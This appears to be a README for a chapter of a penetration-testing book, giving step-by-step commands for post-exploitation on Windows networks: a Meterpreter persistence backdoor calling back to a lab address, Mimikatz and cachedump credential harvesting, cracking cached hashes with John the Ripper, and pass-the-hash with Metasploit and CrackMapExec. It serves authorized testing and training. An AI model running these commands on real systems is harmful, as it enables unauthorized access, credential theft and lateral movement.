# Chapter 8 Readme

## Overview
This documentation discusses post-exploitation techniques related to harvesting credentials and moving laterally within a network.

### Moving Laterally
Moving laterally, or pivoting, involves accessing additional hosts on a network after compromising an initial system. Understanding the distinction between level-one and level-two systems is crucial for reporting and remediation efforts.

#### Key Points
- Differentiate between systems compromised directly and those accessed due to vulnerabilities exposed on other hosts.
- Consider clients' perspectives on remediation efforts.

### Maintaining Reliable Re-entry with Meterpreter
Ensuring persistent access to compromised targets is essential. The documentation covers the installation of a Meterpreter autorun backdoor executable and its configuration.

#### Steps
1. Install the Meterpreter autorun backdoor executable using the provided command:
   ```bash
   meterpreter > run persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.160

#### Harvesting Credentials with Mimikatz
Explore the use of Mimikatz, a powerful tool for extracting clear-text passwords from compromised Windows targets' virtual memory space.

Steps
Load the Mimikatz extension into an active Meterpreter session:
meterpreter > load mimikatz

Use Mimikatz commands like tspkg and wdigest to retrieve clear-text credentials:
meterpreter > tspkg

## Using the Meterpreter post module

To use the Meterpreter post module for extracting domain cached credentials, follow these steps:

1. Open a Meterpreter session.
2. Execute the following command:
    ```bash
    run post/windows/gather/cachedump
    ```
3. Review the output for cached credentials information.

## Cracking cached credentials with John the Ripper

### Installing John the Ripper

1. Clone the John the Ripper repository:
    ```bash
    git clone https://github.com/magnumripper/JohnTheRipper.git
    ```

2. Navigate to the source directory:
    ```bash
    cd JohnTheRipper/src
    ```

3. Configure the source:
    ```bash
    ./configure
    ```

4. Compile the binaries:
    ```bash
    make -s clean && make -sj4
    ```

### Cracking Cached Credentials

1. Create a file named `cached.txt` and paste the cached domain hashes.
2. Run John the Ripper to brute-force passwords:
    ```bash
    ./run/john --format=mscash2 cached.txt
    ```

## Using a dictionary file with John the Ripper

1. Download the Rockyou dictionary:
    ```bash
    wget http://mng.bz/DzMn -O rockyou.txt
    ```

2. Run John the Ripper with the dictionary file:
    ```bash
    ./run/john --format=mscash2 cached.txt --wordlist=rockyou.txt
    ```

## Harvesting credentials from the filesystem

Explore the filesystem for potential credential files. Use commands like `findstr` and `where` to locate files with relevant information.

## Moving laterally with Pass-the-Hash

### Using the Metasploit smb_login module

1. Open the Metasploit console.
2. Load the smb_login module:
    ```bash
    use auxiliary/scanner/smb/smb_login
    ```
3. Set the required parameters:
    ```bash
    set smbuser administrator
    set smbpass [HASH]
    set smbdomain .
    set rhosts file:/path/to/hosts.txt
    set threads 10
    ```
4. Run the module:
    ```bash
    run
    ```

### Passing-the-hash with CrackMapExec

Use CrackMapExec to perform Pass-the-Hash:

```bash
cme smb /path/to/hosts.txt --local-auth -u Administrator -H [NTLM_HASH]

